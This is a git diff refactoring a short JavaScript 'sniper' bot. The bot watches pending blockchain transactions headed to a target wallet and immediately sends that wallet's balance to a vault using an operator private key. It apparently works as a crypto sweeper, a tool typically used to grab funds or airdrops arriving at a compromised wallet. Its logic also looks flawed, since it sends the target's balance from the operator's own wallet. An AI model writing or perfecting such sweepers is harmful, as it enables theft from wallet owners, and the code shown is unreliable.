@@ -1,32 +1,30 @@
-import 'dotenv/config';
-import { createPublicClient, http } from "viem";
+import "dotenv/config";
 import { ethers } from "ethers";
 
-const rpc = process.env.SNIPE_RPC;
 const OG = process.env.OG_WALLET;
 const VAULT = process.env.VAULT;
-const PRIVATE = process.env.OPERATOR_PK;
+const OPERATOR_PK = process.env.OPERATOR_PK;
+const RPC_URL = process.env.SNIPE_RPC;
 
-const provider = new ethers.JsonRpcProvider(rpc);
-const signer = new ethers.Wallet(PRIVATE, provider);
+const provider = new ethers.JsonRpcProvider(RPC_URL);
+const operator = new ethers.Wallet(OPERATOR_PK, provider);
 
-console.log("Sniper READY scanning", OG);
+console.log("Sniper running for:", OG);
 
 provider.on("pending", async (txHash) => {
   try {
     const tx = await provider.getTransaction(txHash);
-    if (!tx || !tx.to) return;
+    if (!tx || tx.to !== OG) return;
 
-    if (tx.to.toLowerCase() === OG.toLowerCase()) {
-      console.log("DETECTED TOKEN/ETH INCOMING:", txHash);
+    console.log("Detected incoming airdrop!", txHash);
 
-      // segera sweep
-      await signer.sendTransaction({
-        to: VAULT,
-        value: await provider.getBalance(OG)
-      });
+    const bal = await provider.getBalance(OG);
 
-      console.log("Sniped & swept!");
-    }
+    await operator.sendTransaction({
+      to: VAULT,
+      value: bal
+    });
+
+    console.log("Sniped and swept to vault.");
   } catch {}
 });
